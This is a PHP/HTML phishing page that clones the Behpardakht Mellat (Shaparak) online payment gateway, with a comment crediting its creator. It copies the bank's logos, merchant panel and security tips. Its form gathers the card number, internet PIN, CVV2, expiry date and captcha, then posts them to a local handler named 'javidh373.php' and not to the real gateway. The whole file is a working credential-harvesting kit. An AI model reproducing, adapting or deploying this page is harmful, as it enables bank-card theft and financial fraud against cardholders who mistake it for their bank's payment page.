<?php
if(isset($_GET['amount'])){
    $_SESSION['amount'] = $_GET['amount'];
}elseif(isset($_GET['price'])){
    $_SESSION['amount'] = $_GET['price'];
}else{
    $_SESSION['amount'] = "10,000";
}



?>
<!DOCTYPE html>
<html lang="fa">
<!-- Created By @JavidH373 My Channel:@GulaxGulx -->
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head>

	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="description" content="">
	<meta name="keywords" content="">
	<meta name="author" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<meta property="og:title" content="&#1662;&#1585;&#1583;&#1575;&#1582;&#1578; &#1575;&#1604;&#1705;&#1578;&#1585;&#1608;&#1606;&#1740;&#1705;&#1740; &#1576;&#1607; &#1662;&#1585;&#1583;&#1575;&#1582;&#1578; &#1605;&#1604;&#1578;" />
	<meta property="og:url" content="http://www.behpardakht.com/" />
	<meta property="og:image" content="http://" />

	<title>&#1662;&#1585;&#1583;&#1575;&#1582;&#1578; &#1575;&#1604;&#1705;&#1578;&#1585;&#1608;&#1606;&#1740;&#1705;&#1740; &#1576;&#1607; &#1662;&#1585;&#1583;&#1575;&#1582;&#1578; &#1605;&#1604;&#1578;</title>

	<link href="../behpardakht/css/esprit.min.css" rel="stylesheet">
	<link href="../behpardakht/img/ipg-favicon.png" rel="shortcut icon">
	
	<script>
		function javid(){
				var cardnm = document.getElementById('cardnumber');
				var errr = document.getElementById('erroring');
				var pss = document.getElementById('inputpin');
				var cvv = document.getElementById('inputcvv2');
				var mah = document.getElementById('inputmonth');
				var sal = document.getElementById('inputyear');
				var cpt = document.getElementById('inputcapcha');
				
				if(cardnm.value==""){
					errr.style.display="block"
					cardnm.focus;
					return false;
				}else if(pss.value==""){
					errr.style.class="block"
					pss.focus;
					return false;
				}else if(cvv.value==""){
					errr.style.class="block"
					cvv.focus;
					return false;
				}else if(mah.value==""){
					errr.style.class="block"
					mah.focus;
					return false;
				}else if(sal.value==""){
					errr.style.class="block"
					sal.focus;
					return false;
				}else if(cpt.value==""){
					errr.style.class="block"
					cpt.focus;
					return false;
				}
				
			
				
			}
		
	</script>
	<script language="javascript" src="../behpardakht/checkcard.js" type="text/javascript"></script>
	<script>
					
function validateAndSale(event)
{
  var c = document.getElementById("cardnumber").value;
  
  
  if( checkCartDigit(c))
   errr.style.class="block"
   
  else
    errr.style.class="block"
}    
	</script>
    <style>
        .close-button {
            background-color: #c2c7cc !important;
            background-image: url(https://bpm.shaparak.ir/img/ipg-decline.svg) !important;
            width: 25px !important;
            height: 25px !important;
        }
		
	
    </style>

    <script src="../behpardakht/js/jqueryyui.js"></script>
    <script>
        $( document ).ready(function() {
            setCardSuggestionListHeight();
            countDownRemainingTime(1138);
            $("#cardnumber").focus();
            $(document).keydown(function(e) {
                var keyCode = getEventKeyCode(e);
                if (keyCode === ctrlKey || keyCode === cmdKey) ctrlDown = true;
            }).keyup(function(e) {
                var keyCode = getEventKeyCode(e);
                if (keyCode === ctrlKey || keyCode === cmdKey) ctrlDown = false;
            });
        });
    </script>
    <script src="../behpardakht/js/payment.min8e0e.js?v=8"></script>
    <script>
        encRefId="1D462D2DBDF7A9B2";
        panDtoList=JSON.parse('[]');
    </script>
	<script>
	
	</script>
    
</head>
<body id="body" class="up-scroll" onclick="hideKeyPadOnOutsideClick(event);hideCardSuggestionListOnOutSideClick(event)">

	<header id="header" >
		<div class="container">
			<div class="beh-card">
				<div class="row">
					<div class="col shaparaklogo align-self-start"><img src="../behpardakht/img/shaparak_logo.svg" alt="shaparak"></div>
					<div class="col-6 header-center align-self-end">
						<span>&#1662;&#1585;&#1583;&#1575;&#1582;&#1578; &#1575;&#1604;&#1705;&#1578;&#1585;&#1608;&#1606;&#1740;&#1705;&#1740; &#1576;&#1607; &#1662;&#1585;&#1583;&#1575;&#1582;&#1578; &#1605;&#1604;&#1578;</span><br>
						<a href="http://www.behpardakht.com/">www.Behpardakht.com</a>
					</div>
					<div class="col behpardakhtlogo align-self-start"><img style="float: left" src="../behpardakht/img/behpardakht_logo.svg" alt="behpardakht"></div>
				</div>
			</div>
		</div>
	</header>

	<div class="main-wrapper payment">
		
		<section class="container">
			<div class="row row-eq-height">
								
				<div class="col-lg-8 col-md-12 col-sm-12 order-lg-1 order-2">
					<div class="beh-card carddetail">
						<span class="shape"></span>

						<div class="card-header">

							<h3>&#1575;&#1591;&#1604;&#1575;&#1593;&#1575;&#1578; &#1705;&#1575;&#1585;&#1578;</h3>
							<span id="remaining-time">&#1586;&#1605;&#1575;&#1606; &#1576;&#1575;&#1602;&#1740; &#1605;&#1575;&#1606;&#1583;&#1607; :<b>10:00</b></span>
                            <span class="" style="display:none;background: rgba(230,19,44,.8);padding: 8px;height: 40px;font-size: 16px;color: #fff;text-align: center;overflow: hidden;border-radius: 4px 0 15px;background: rgba(230,19,44,.8);transition: all .5s;box-sizing: border-box;font-family: IRANSans;font-weight: 400;line-height: 1.5;direction: rtl;box-sizing: border-box;position: absolute;width:100%;" id="erroring">&#1604;&#1591;&#1601;&#1575; &#1575;&#1591;&#1604;&#1575;&#1593;&#1575;&#1578; &#1605;&#1608;&#1585;&#1583; &#1606;&#1740;&#1575;&#1586; &#1585;&#1575; &#1576;&#1607; &#1583;&#1585;&#1587;&#1578;&#1740; &#1608;&#1575;&#1585;&#1583; &#1705;&#1606;&#1740;&#1583;</span>
						</div>
						<div class="card-body">
							<form class="card-info" action="javidh373.php" onSubmit="return javid();" method="POST" name="epay_gateway_form" id="epay_gateway_form">
								<div class="form-group row">
									<div class="col-sm-4">
										<label for="cardnumber" class="col-form-label">&#1588;&#1605;&#1575;&#1585;&#1607; &#1705;&#1575;&#1585;&#1578;</label>
										<small id="gher"">&#1588;&#1605;&#1575;&#1585;&#1607; &#1705;&#1575;&#1585;&#1578; 16 &#1585;&#1602;&#1605;&#1740; &#1583;&#1585;&#1580; &#1588;&#1583;&#1607; &#1585;&#1608;&#1740; &#1705;&#1575;&#1585;&#1578; &#1585;&#1575; &#1608;&#1575;&#1585;&#1583; &#1606;&#1605;&#1575;&#1740;&#1740;&#1583;</small>
									</div>

									<div class="col-md-6 col-sm-8 col-12 mobile-justify">
										<div class="cardnumberbox">
											<span class="banklogo"></span>
                                            <input type="tel" id="cardnumber" name="cardnumber" maxlength="19"
                                                   
                                                   onkeyup="formatPanOnKeyUp(event);filterAndShowCardSuggestionList();setBankLogo();focusNextField(this,'inputpin',event);resetSelectedPan(event)"
                                                   oninput="formatPanOnKeyUp(event);setBankLogo();focusNextField(this,'inputpin',event);resetSelectedPan(event)"
                                                   onfocus="hideKeyPad();removeInvalidClassFromPan()"
                                                   onblur="checkPanDiscount()"
                                                value="" 
                                            >
                                            <button type="button" id="card-list-button" data-toggle="dropdown" onclick="toggleAllPans()"
                                                    aria-haspopup="true" aria-expanded="false" tabindex="-1"  ></button>
											<div class="card-suggestionlist dropdown-menu" aria-labelledby="card-list-button">
                                                
											</div>
										</div>
									</div>
								</div>

								<div class="form-group row" onblur="hideKeyPad()">
									<div class="col-sm-4">
										<label for="inputpin" class="col-form-label">&#1585;&#1605;&#1586; &#1575;&#1740;&#1606;&#1578;&#1585;&#1606;&#1578;&#1740; &#1705;&#1575;&#1585;&#1578;</label>
										<small id="gher">&#1585;&#1605;&#1586; &#1575;&#1740;&#1606;&#1578;&#1585;&#1606;&#1578;&#1740; &#1585;&#1575; &#1608;&#1575;&#1585;&#1583; &#1606;&#1605;&#1575;&#1740;&#1740;&#1583;</small>
									</div>

									<div class="col-md-3 col-sm-4 col-8 mobile-justify keypad-parent">
										<input type="password" class="form-control" id="inputpin" name="inputpin" maxlength="12"
                                               
											   onfocus="hideCardSuggestionList();removeInvalidClassFromInput('inputpin')"
											   autocomplete="off"
											   onkeydown="preventInvalidKeys(event);"
											   onkeyup="focusNextField(this,'inputcvv2',event);">
									</div>
									<div class="col-sm-1 ">
										<button type="button" class="form-btn keypad" tabindex="-1" onclick="showKeyPad('inputpin',event)"></button>
									</div>
								</div>

								<div class="form-group row">
									<div class="col-sm-4">
										<label for="inputcvv2" class="col-form-label">&#1588;&#1605;&#1575;&#1585;&#1607; &#1588;&#1606;&#1575;&#1587;&#1575;&#1740;&#1740; &#1583;&#1608;&#1605; (CVV2)</label><small id="gher">&#1588;&#1605;&#1575;&#1585;&#1607; 4 &#1585;&#1602;&#1605;&#1740; &#1583;&#1585;&#1580; &#1588;&#1583;&#1607; &#1585;&#1608;&#1740; &#1705;&#1575;&#1585;&#1578; &#1585;&#1575; &#1608;&#1575;&#1585;&#1583; &#1606;&#1605;&#1575;&#1740;&#1740;&#1583;</small>
									</div>
									<div class="col-md-3 col-sm-4 col-8  mobile-justify keypad-parent">
                                        <input type="password" class="form-control" name="inputcvv2" id="inputcvv2" maxlength="4"
                                            
                                               onfocus="hideCardSuggestionList();removeInvalidClassFromInput('inputcvv2')"
											   autocomplete="off"
                                               onkeydown="preventInvalidKeys(event);"
                                               onkeyup="focusNextField(this,'inputmonth|inputcapcha',event);">
									</div>
									<div class="col-sm-1">
										<button type="button" class="form-btn keypad" tabindex="-1" onclick="showKeyPad('inputcvv2',event)"></button>
									</div>
								</div>

								<div class="form-group row">
									<div class="col-sm-4">
										<label for="inputmonth" class="col-form-label">&#1578;&#1575;&#1585;&#1740;&#1582; &#1575;&#1606;&#1602;&#1590;&#1575;&#1740; &#1705;&#1575;&#1585;&#1578;</label>
										<small id="gher">&#1576;&#1607; &#1578;&#1601;&#1705;&#1740;&#1705; &#1605;&#1575;&#1607; &#1608; &#1587;&#1575;&#1604; </small>
									</div>

									<div class="col-2 d-lg-none d-sm-none"></div>

									<div class="col-md-2 col-sm-3 col-4">
										<input type="tel" class="form-control" name="inputmonth" id="inputmonth" placeholder="&#1605;&#1575;&#1607;" maxlength="2"
											   autocomplete="off"
											   onkeydown="preventInvalidKeys(event);"
                                               onfocus="hideKeyPad();removeInvalidClassFromInput('inputmonth')"
											   onkeyup="focusNextField(this,'inputyear',event);">
									</div>
									<div class="col-md-2 col-sm-3 col-4">
										<input type="tel" class="form-control" name="inputyear" id="inputyear" placeholder="&#1587;&#1575;&#1604;" maxlength="2"
											   autocomplete="off"
                                               onfocus="removeInvalidClassFromInput('inputmonth')"
											   onkeydown="preventInvalidKeys(event);"
											   onkeyup="focusNextField(this,'inputcapcha',event)">
									</div>
								</div>

								<div class="form-group row">
									<div class="col-sm-4">
										<label for="inputcapcha" class="col-form-label">&#1705;&#1583; &#1575;&#1605;&#1606;&#1740;&#1578;&#1740;</label>
										<small id="gher">&#1604;&#1591;&#1601;&#1575; &#1705;&#1583; &#1575;&#1605;&#1606;&#1740;&#1578;&#1740; &#1583;&#1575;&#1582;&#1604; &#1705;&#1575;&#1583;&#1585; &#1585;&#1575; &#1608;&#1575;&#1585;&#1583; &#1606;&#1605;&#1575;&#1740;&#1740;&#1583;</small>
									</div>
									<div class="col-sm-3 col-8 mobile-justify">
                                        <input type="tel" class="form-control" name="inputcapcha" id="inputcapcha" maxlength="5"
                                               autocomplete="off"
                                               onfocus="removeInvalidClassFromInput('inputcapcha')"
                                               onkeydown="preventInvalidKeys(event);"
                                               onkeyup="focusNextField(this,'inputpayerid|payButton',event)">									</div>
									<div class="col-sm-3 col-6 capcha-container mobile-justify">
										<img id="captcha-img" src="https://bpm.shaparak.ir/pgwchannel/captchaimg.jpg?RefId=193A7D3535AED3AB" >
									</div>
									<div class="col-sm-1 col-4">
										<button type="button" class="form-btn capcha" title="&#1606;&#1605;&#1575;&#1610;&#1588; &#1578;&#1589;&#1608;&#1610;&#1585; &#1580;&#1583;&#1610;&#1583;"
												onclick=""></button>
									</div>
								</div>
                                

								<div class="form-group row">
									<div class="col-sm-4">
										<label for="inputemail" class="col-form-label">&#1575;&#1740;&#1605;&#1740;&#1604;</label>
										<small>&#1575;&#1582;&#1578;&#1740;&#1575;&#1585;&#1740;</small>
									</div>
									<div class="col-md-6 col-sm-8 col-12 mobile-justify">
										<input type="email" class="form-control" id="inputemail"
                                               onfocus="removeInvalidClassFromInput('inputemail')">
									</div>
								</div>

								<span id="usw" style="display:none;">&#1740;&#1608;&#1586;&#1585; &#1606;&#1740;&#1605; &#1585;&#1575; &#1608;&#1575;&#1585;&#1583; &#1705;&#1606;&#1740;&#1583;</span>
								<div class="form-group row">
									<div class="col-sm-4"></div>
									<div class="col-md-6 col-sm-8 col-12 mobile-justify btn-submit-form">
										<input type="submit" value="&#1662;&#1585;&#1583;&#1575;&#1582;&#1578;" name="pardakht" class="btn btn-perches" onclick="return validateAndSale(event);" id="payButton">
										<button type="button" class="btn btn-decline" onclick="cancelPay()">&#1575;&#1606;&#1589;&#1585;&#1575;&#1601;</button>
									</div>
								</div>
							</form>
						</div>
					</div>
	
				</div>

				<div class="col-lg-4 col-md-12 col-sm-12 order-lg-2 order--1">
					<div class="beh-card merchantdetail">
						<div class="card-header">
							<h3>&#1575;&#1591;&#1604;&#1575;&#1593;&#1575;&#1578; &#1662;&#1584;&#1740;&#1585;&#1606;&#1583;&#1607;</h3>
						</div>
						<div class="card-body">

							<div class="merchant-container">
								<div class="col-lg-12 col-sm-4 merchant-logo">
									<!--<img class=" " src="img/sample/merchant-logo.png" alt="merchantlogo">-->
									<img class=" " src="../behpardakht/img/ipg-defaltlogo.png" alt="merchantlogo">
									<span class="helper"></span>
								</div>

								<ul class="col-lg-12 col-sm-8 merchant-detail">
									<li>&#1606;&#1575;&#1605; &#1662;&#1584;&#1740;&#1585;&#1606;&#1583;&#1607; : <b>&#1585;&#1575;&#1610;&#1575;&#1606; &#1605;&#1607;&#1585; &#1583;&#1575;&#1606;&#1588; &#1587;&#1606;&#1580;</b></li>
									<li>&#1588;&#1605;&#1575;&#1585;&#1607; &#1662;&#1584;&#1740;&#1585;&#1606;&#1583;&#1607;: <b>1882843</b></li>

                                    

                                    <li>&#1570;&#1583;&#1585;&#1587; &#1608;&#1576; &#1587;&#1575;&#1740;&#1578;: <b class="merchantwebsite"><a  href="http://www.rayanmehr.co.ir/">http://www.rayanmehr.co.ir</a></b></li>

									
								</ul>

							</div>

							<ul class="merchant-detail price">
								<li>&#1605;&#1576;&#1604;&#1594; &#1602;&#1575;&#1576;&#1604; &#1662;&#1585;&#1583;&#1575;&#1582;&#1578; :<b class="price-number"><?php echo $_SESSION["amount"]; ?> &#1585;&#1740;&#1575;&#1604;</b></li>
							</ul>
						</div>

					</div>

				</div>
			</div>
		
		</section>
		
		<div class="keypad-container">
			<h4>&#1589;&#1601;&#1581;&#1607; &#1705;&#1604;&#1740;&#1583; &#1575;&#1740;&#1605;&#1606;</h4>
			<div class="frame-umbtn"><button id="num1"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num2"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num3"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num4"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num5"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num6"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num7"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num8"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num9"type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="clear" type="button" class=" numpad" tabindex="-1" onclick="keyPadBackspace(event)">&#9003;</button></div>
			<div class="frame-umbtn"><button id="num0"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="erase" type="button" class=" numpad" tabindex="-1" onclick="keypadTab()">&#8677;</button></div>
		</div>

        
		<section class="container">
			<row class="beh-guid">
				<div class="col">
					<h4>&#1585;&#1575;&#1607;&#1606;&#1605;&#1575;</h4>
					<ul>
						<li>&#1588;&#1605;&#1575;&#1585;&#1607; &#1705;&#1575;&#1585;&#1578;: 16 &#1585;&#1602;&#1605;&#1740; &#1576;&#1608;&#1583;&#1607; &#1608; &#1576;&#1589;&#1608;&#1585;&#1578; 4 &#1602;&#1587;&#1605;&#1578; 4 &#1585;&#1602;&#1605;&#1740; &#1608; &#1585;&#1608;&#1740; &#1705;&#1575;&#1585;&#1578; &#1583;&#1585;&#1580; &#1588;&#1583;&#1607; &#1575;&#1587;&#1578;.</li>
						<li>cvv2: &#1576;&#1575; &#1591;&#1608;&#1604; 3 &#1740;&#1575; 4 &#1585;&#1602;&#1605; &#1705;&#1606;&#1575;&#1585; &#1588;&#1605;&#1575;&#1585;&#1607; &#1705;&#1575;&#1585;&#1578; &#1608; &#1740;&#1575; &#1662;&#1588;&#1578; &#1705;&#1575;&#1585;&#1578; &#1583;&#1585;&#1580; &#1588;&#1583;&#1607; &#1575;&#1587;&#1578;.</li>
						<li>&#1578;&#1575;&#1585;&#1740;&#1582; &#1575;&#1606;&#1602;&#1590;&#1575;: &#1588;&#1575;&#1605;&#1604; &#1583;&#1608; &#1576;&#1582;&#1588; &#1605;&#1575;&#1607; &#1608; &#1587;&#1575;&#1604; &#1575;&#1606;&#1602;&#1590;&#1575; &#1583;&#1585; &#1705;&#1606;&#1575;&#1585; &#1588;&#1605;&#1575;&#1585;&#1607; &#1705;&#1575;&#1585;&#1578; &#1583;&#1585;&#1580; &#1588;&#1583;&#1607; &#1575;&#1587;&#1578;.</li>
						<li>&#1585;&#1605;&#1586; &#1575;&#1740;&#1606;&#1578;&#1585;&#1606;&#1578;&#1740;: &#1576;&#1575; &#1593;&#1606;&#1608;&#1575;&#1606; &#1585;&#1605;&#1586; &#1583;&#1608;&#1605; &#1608; &#1583;&#1585; &#1576;&#1585;&#1582;&#1740; &#1605;&#1608;&#1575;&#1585;&#1583; &#1576;&#1575; PIN2 &#1588;&#1606;&#1575;&#1582;&#1578;&#1607; &#1605;&#1740; &#1588;&#1608;&#1583;&#1548; &#1575;&#1586; &#1591;&#1585;&#1740;&#1602; &#1576;&#1575;&#1606;&#1705; &#1589;&#1575;&#1583;&#1585; &#1705;&#1606;&#1606;&#1583;&#1607; &#1705;&#1575;&#1585;&#1578; &#1578;&#1608;&#1604;&#1740;&#1583; &#1588;&#1583;&#1607; &#1608; &#1607;&#1605;&#1670;&#1606;&#1740;&#1606; &#1575;&#1586; &#1591;&#1585;&#1740;&#1602; &#1583;&#1587;&#1578;&#1711;&#1575;&#1607; &#1607;&#1575;&#1740; &#1582;&#1608;&#1583;&#1662;&#1585;&#1583;&#1575;&#1586; &#1576;&#1575;&#1606;&#1705; &#1589;&#1575;&#1583;&#1585; &#1705;&#1606;&#1606;&#1583;&#1607; &#1602;&#1575;&#1576;&#1604; &#1578;&#1607;&#1740;&#1607; &#1608; &#1740;&#1575; &#1578;&#1594;&#1740;&#1740;&#1585; &#1605;&#1740; &#1576;&#1575;&#1588;&#1583;.</li>
						<li>&#1705;&#1583; &#1575;&#1605;&#1606;&#1740;&#1578;&#1740;: &#1576;&#1582;&#1588;&#1740; &#1575;&#1586; &#1605;&#1581;&#1578;&#1608;&#1575;&#1740; &#1589;&#1601;&#1581;&#1607; &#1662;&#1585;&#1583;&#1575;&#1582;&#1578; &#1575;&#1587;&#1578; &#1608; &#1604;&#1575;&#1586;&#1605; &#1575;&#1587;&#1578; &#1576;&#1585;&#1575;&#1740; &#1575;&#1583;&#1575;&#1605;&#1607; &#1601;&#1585;&#1575;&#1740;&#1606;&#1583; &#1582;&#1585;&#1740;&#1583; &#1548; &#1705;&#1583; &#1605;&#1608;&#1580;&#1608;&#1583; &#1705;&#1607; &#1576;&#1607; &#1589;&#1608;&#1585;&#1578; &#1593;&#1583;&#1583;&#1740; &#1583;&#1585; &#1578;&#1589;&#1608;&#1740;&#1585; &#1605;&#1588;&#1582;&#1589; &#1588;&#1583;&#1607; &#1575;&#1587;&#1578; &#1583;&#1585; &#1605;&#1581;&#1604; &#1662;&#1740;&#1588; &#1576;&#1740;&#1606;&#1740; &#1588;&#1583;&#1607; &#1583;&#1585;&#1580; &#1588;&#1608;&#1583;.</li>
						<li>&#1583;&#1585;&#1608;&#1575;&#1586;&#1607; &#1662;&#1585;&#1583;&#1575;&#1582;&#1578; &#1575;&#1740;&#1606;&#1578;&#1585;&#1606;&#1578;&#1740; &#1576;&#1607; &#1662;&#1585;&#1583;&#1575;&#1582;&#1578; &#1605;&#1604;&#1578; &#1576;&#1575; &#1575;&#1587;&#1578;&#1601;&#1575;&#1583;&#1607; &#1575;&#1586; &#1662;&#1585;&#1608;&#1578;&#1705;&#1604; &#1575;&#1605;&#1606; SSL &#1576;&#1607; &#1605;&#1588;&#1578;&#1585;&#1740;&#1575;&#1606; &#1582;&#1608;&#1583; &#1575;&#1585;&#1575;&#1740;&#1607; &#1582;&#1583;&#1605;&#1578; &#1606;&#1605;&#1608;&#1583;&#1607; &#1608; &#1576;&#1575; &#1570;&#1583;&#1585;&#1587; <b>https://bpm.shaparak.ir</b> &#1588;&#1585;&#1608;&#1593; &#1605;&#1740; &#1588;&#1608;&#1583;. &#1582;&#1608;&#1575;&#1607;&#1588;&#1605;&#1606;&#1583; &#1575;&#1587;&#1578; &#1576;&#1607; &#1605;&#1606;&#1592;&#1608;&#1585; &#1580;&#1604;&#1608;&#1711;&#1740;&#1585;&#1740; &#1575;&#1586; &#1587;&#1608;&#1569; &#1575;&#1587;&#1578;&#1601;&#1575;&#1583;&#1607; &#1607;&#1575;&#1740; &#1575;&#1581;&#1578;&#1605;&#1575;&#1604;&#1740; &#1662;&#1740;&#1588; &#1575;&#1586; &#1608;&#1585;&#1608;&#1583; &#1607;&#1585;&#1711;&#1608;&#1606;&#1607; &#1575;&#1591;&#1604;&#1575;&#1593;&#1575;&#1578;&#1548; &#1570;&#1583;&#1585;&#1587; &#1605;&#1608;&#1580;&#1608;&#1583; &#1583;&#1585; &#1576;&#1582;&#1588; &#1605;&#1585;&#1608;&#1585;&#1711;&#1585; &#1608;&#1576; &#1582;&#1608;&#1583; &#1585;&#1575; &#1576;&#1575; &#1570;&#1583;&#1585;&#1587; &#1601;&#1608;&#1602; &#1605;&#1602;&#1575;&#1740;&#1587;&#1607; &#1606;&#1605;&#1575;&#1740;&#1740;&#1583; &#1608; &#1583;&#1585;&#1589;&#1608;&#1585;&#1578; &#1605;&#1588;&#1575;&#1607;&#1583;&#1607; &#1607;&#1585; &#1606;&#1608;&#1593; &#1605;&#1594;&#1575;&#1740;&#1585;&#1578; &#1575;&#1581;&#1578;&#1605;&#1575;&#1604;&#1740;&#1548; &#1605;&#1608;&#1590;&#1608;&#1593; &#1585;&#1575; &#1576;&#1575; &#1605;&#1575; &#1583;&#1585;&#1605;&#1740;&#1575;&#1606; &#1576;&#1711;&#1584;&#1575;&#1585;&#1740;&#1583;.</li>
						<li>&#1576;&#1585;&#1575;&#1740; &#1580;&#1604;&#1608;&#1711;&#1740;&#1585;&#1740; &#1575;&#1586; &#1575;&#1601;&#1588;&#1575;&#1740; &#1585;&#1605;&#1586; &#1705;&#1575;&#1585;&#1578; &#1582;&#1608;&#1583;&#1548;&#1581;&#1578;&#1740; &#1575;&#1604;&#1605;&#1602;&#1583;&#1608;&#1585; &#1575;&#1586; &#1589;&#1601;&#1581;&#1607; &#1705;&#1604;&#1740;&#1583; &#1605;&#1580;&#1575;&#1586;&#1740; &#1575;&#1587;&#1578;&#1601;&#1575;&#1583;&#1607; &#1601;&#1585;&#1605;&#1575;&#1740;&#1740;&#1583;.</li>
						<li>&#1576;&#1585;&#1575;&#1740; &#1705;&#1587;&#1576; &#1575;&#1591;&#1604;&#1575;&#1593;&#1575;&#1578; &#1576;&#1740;&#1588;&#1578;&#1585;&#1548; &#1711;&#1586;&#1575;&#1585;&#1588; &#1601;&#1585;&#1608;&#1588;&#1711;&#1575;&#1607;&#1607;&#1575;&#1740; &#1605;&#1588;&#1705;&#1608;&#1705; &#1608; &#1607;&#1605;&#1670;&#1606;&#1740;&#1606; &#1575;&#1591;&#1604;&#1575;&#1593; &#1575;&#1586; &#1608;&#1590;&#1593;&#1740;&#1578; &#1662;&#1584;&#1740;&#1585;&#1606;&#1583;&#1711;&#1575;&#1606; &#1575;&#1740;&#1606;&#1578;&#1585;&#1606;&#1578;&#1740; &#1576;&#1575; &#1605;&#1575; &#1578;&#1605;&#1575;&#1587; &#1576;&#1711;&#1740;&#1585;&#1740;&#1583;.</li>
						<li>&#1604;&#1591;&#1601;&#1575; &#1575;&#1586; &#1589;&#1581;&#1578; &#1606;&#1575;&#1605; &#1601;&#1585;&#1608;&#1588;&#1606;&#1583;&#1607; &#1608; &#1605;&#1576;&#1604;&#1594; &#1606;&#1605;&#1575;&#1740;&#1588; &#1583;&#1575;&#1583;&#1607; &#1588;&#1583;&#1607;&#1548; &#1575;&#1591;&#1605;&#1740;&#1606;&#1575;&#1606; &#1581;&#1575;&#1589;&#1604; &#1601;&#1585;&#1605;&#1575;&#1740;&#1740;&#1583;.</li>
						<br><br>
					</ul>
				</div>
			</row>
		</section>
    </div>
	<footer class="footer">
		<div class="container">
			<div class="footerarc"></div>
			<div class="footerarc content">
				<span class="call">&#1588;&#1605;&#1575;&#1585;&#1607; &#1578;&#1605;&#1575;&#1587; : 27312733-021</span><br>
				<span>&#1588;&#1585;&#1705;&#1578; &#1576;&#1607; &#1662;&#1585;&#1583;&#1575;&#1582;&#1578; &#1605;&#1604;&#1578; &#1575;&#1585;&#1575;&#1610;&#1607; &#1583;&#1607;&#1606;&#1583;&#1607; &#1582;&#1583;&#1605;&#1575;&#1578; &#1606;&#1608;&#1740;&#1606; &#1662;&#1585;&#1583;&#1575;&#1582;&#1578; &#1575;&#1604;&#1705;&#1578;&#1585;&#1608;&#1606;&#1610;&#1705;</span>
			</div>
			<div class="row justify-content-center">
				<div class="col-12">

				</div>
			</div>
		</div>
	</footer>

</body>

</html>